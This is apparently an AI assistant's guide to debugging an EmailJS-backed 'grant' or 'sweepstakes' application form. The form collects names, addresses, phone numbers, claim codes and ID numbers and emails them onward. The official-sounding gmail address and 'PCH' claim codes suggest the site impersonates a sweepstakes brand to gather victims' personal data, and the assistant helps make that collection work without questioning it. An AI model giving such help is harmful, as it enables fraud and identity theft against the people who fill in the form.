# EmailJS Form Submission Troubleshooting Guide

## Problem: Form Submissions Not Arriving

You have a working EmailJS template test, but live form submissions aren't being delivered. Here's how to diagnose and fix the issue.

---

## 🔍 Step 1: Enable Diagnostic Mode

I've added detailed logging to your forms. Now when users submit:

1. **Open DevTools** (F12)
2. **Click Console tab**
3. **Look for messages like**:
   ```
   === GRANT FORM SUBMISSION ===
   ✅ Validation passed
   📧 Preparing to send email...
   ✅ Email sent successfully!
   ```

---

## 🔴 Common Issues & Fixes

### Issue 1: "❌ EmailJS not available"

**Cause**: EmailJS library isn't loaded

**Fix**:
1. Check your HTML has this before `</body>`:
```html
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/emailjs.min.js"></script>
<script src="js/main.js"></script>
```

2. Verify order is correct (EmailJS BEFORE main.js)

---

### Issue 2: Form Data Mismatch

**Cause**: Form field names don't match template variables

**Solution**: Check your template expects these exact variable names:

For **Grant Form** (template_n6ag76q):
```
{{claim_code}}        ← from form name="claimCode"
{{full_name}}         ← from form name="fullName"
{{email}}             ← from form name="email"
{{phone}}             ← from form name="phone"
{{address}}           ← from form name="address"
{{sweepstakes_type}}  ← from form name="grantType"
{{delivery_card}}     ← from form name="idNumber"
{{additional_info}}   ← from form name="additionalInfo"
{{subject}}           ← generated in code
```

**In EmailJS Dashboard**:
1. Go to Email Templates
2. Click on template_n6ag76q
3. Check the Preview shows these exact variable names
4. If template has different names, update the code to match

---

### Issue 3: "Error Status 403" or "Status 401"

**Cause**: Authentication issue with EmailJS

**Fix**:
1. Go to https://dashboard.emailjs.com
2. Check your **Public Key** (in Account Settings)
3. It should match what's in main.js initialization:
```javascript
emailjs.init("u6LwWkk8fv67W37h4");
```

4. If different, update main.js line ~63

---

### Issue 4: "Error Status 404"

**Cause**: Template ID or Service ID doesn't exist

**Fix**:
1. Go to https://dashboard.emailjs.com
2. Click **Email Services** → find your service
3. Copy **Service ID** → should be `service_kgs6vjh`
4. Click **Email Templates** → find template
5. Copy **Template ID** → should be `template_n6ag76q`
6. Update main.js if they don't match

---

## 📋 Form Field Verification Checklist

### Apply Form (/apply.html)

Check these fields exist with these exact names:

- [ ] `<input name="claimCode" ... />` 
- [ ] `<input name="fullName" ... />`
- [ ] `<input name="email" ... />`
- [ ] `<input name="phone" ... />`
- [ ] `<textarea name="address" ... />`
- [ ] `<select name="grantType" ... />`
- [ ] `<input name="idNumber" ... />`
- [ ] `<textarea name="additionalInfo" ... />`
- [ ] `<input name="terms" type="checkbox" />`

**⚠️ IMPORTANT**: If ANY field name is wrong, that field won't be sent to EmailJS!

---

## 🧪 Testing Steps

### Step 1: Test EmailJS Directly
1. Open `/apply.html` in browser
2. Press F12 to open console
3. Type this and press Enter:
```javascript
sendTestEmail()
```
4. Check console for "✅ Test email sent successfully"
5. Check your email inbox for the test email

**If test email works but form doesn't**: Problem is with form data mapping

---

### Step 2: Test Form Submission with Logging

1. Open `/apply.html`
2. Press F12 (Console tab)
3. Fill out the form completely
4. Click "Submit Application"
5. Watch console for detailed logs

**Look for**:
```
=== GRANT FORM SUBMISSION ===
Form submit triggered
✅ Validation passed, preparing form data
Form data extracted: {claimCode: "...", fullName: "...", ...}
📧 Preparing to send email...
Email parameters: {...}
✅ Email sent successfully!
```

---

### Step 3: Check Email Inbox

1. Check your **primary inbox**
2. Check **SPAM/Junk folder**
3. Check **Promotions tab** (if Gmail)
4. Wait 1-2 minutes for delivery

---

## 🔧 Debugging Tips

### Enable Extra Logging
Add this to your browser console to see more details:
```javascript
// Enable all console messages
console.log('Checking form submission...', document.getElementById('sweepstakes'));

// Test sending manually
const testData = {
    claim_code: 'TEST123',
    full_name: 'Test User',
   email: 'officialpch00112@gmail.com',
    phone: '+1234567890',
    address: '123 Test St',
    sweepstakes_type: 'innovation',
    delivery_card: 'Standard',
    additional_info: 'Test',
    subject: 'Test Email'
};

emailjs.send('service_kgs6vjh', 'template_n6ag76q', testData)
    .then(r => console.log('✅ Sent:', r))
    .catch(e => console.error('❌ Failed:', e));
```

---

## 📊 Status Code Reference

| Code | Meaning | Fix |
|------|---------|-----|
| 200 | Success | Check email inbox |
| 400 | Bad request | Check form data format |
| 401 | Unauthorized | Check Public Key in main.js |
| 403 | Forbidden | Check API key/permissions |
| 404 | Not found | Check Service ID and Template ID |
| 422 | Validation error | Check template variables match |
| 429 | Rate limited | Wait before retrying |
| 500 | Server error | Try again later |

---

## 🚨 If Nothing Works

### Nuclear Option: Verify EmailJS Account

1. Go to https://dashboard.emailjs.com
2. Look at **Email Services**:
   - Should show a connected service (Gmail, Outlook, etc.)
   - If red/disconnected, reconnect it

3. Look at **Email Templates**:
   - Should show at least template_n6ag76q
   - Open it and check variable names

4. Look at **Email Logs**:
   - Should show recent send attempts
   - If no attempts, form not reaching EmailJS
   - If attempts but no delivery, email service issue

---

## 📞 Getting More Help

**For EmailJS issues**:
1. Go to https://dashboard.emailjs.com
2. Click **Email Logs** tab
3. Look at recent attempts
4. See error messages
5. Check EmailJS documentation: https://www.emailjs.com/docs/

**For form issues**:
1. Check browser console messages (F12)
2. Verify form field names (inspect with F12)
3. Check HTML file hasn't been modified

---

## 🎯 Quick Checklist

Before reporting an issue, verify:

- [ ] EmailJS library is loaded (check `<script src="...emailjs...">`)
- [ ] EmailJS is initialized (check main.js line 63)
- [ ] Service ID is correct: `service_kgs6vjh`
- [ ] Template ID is correct: `template_n6ag76q`
- [ ] Template exists in dashboard
- [ ] Email service is connected in dashboard
- [ ] Form field names match template variables
- [ ] Form submits without validation errors
- [ ] Console shows "Email sent successfully"
- [ ] Checked email inbox AND spam folder

---

## Example: Expected Console Output

When form submits successfully:

```javascript
=== GRANT FORM SUBMISSION ===
Form submit triggered
✅ Validation passed, preparing form data
Form data extracted: {
  claimCode: "PCHXYZ123456",
  fullName: "John Doe",
  email: "john@example.com",
  phone: "+1-279-222-1855",
  address: "123 Main St, City, State",
  grantType: "innovation",
  idNumber: "12345",
  additionalInfo: "My application info",
  terms: "on"
}
📧 Preparing to send email...
Service ID: service_kgs6vjh
Template ID: template_n6ag76q
Email parameters: {
  claim_code: "PCHXYZ123456",
  full_name: "John Doe",
  email: "john@example.com",
  phone: "+1-279-222-1855",
  address: "123 Main St, City, State",
  sweepstakes_type: "innovation",
  delivery_card: "12345",
  additional_info: "My application info",
  reply_to: "john@example.com",
  subject: "New Sweepstakes Application — John Doe (PCHXYZ123456)"
}
✅ Email sent successfully!
Response status: 200
Response text: OK
```

If you see this, the email was sent! Check your inbox.

---

**Start at Step 1 above and follow the process. Let me know what console messages you see!**
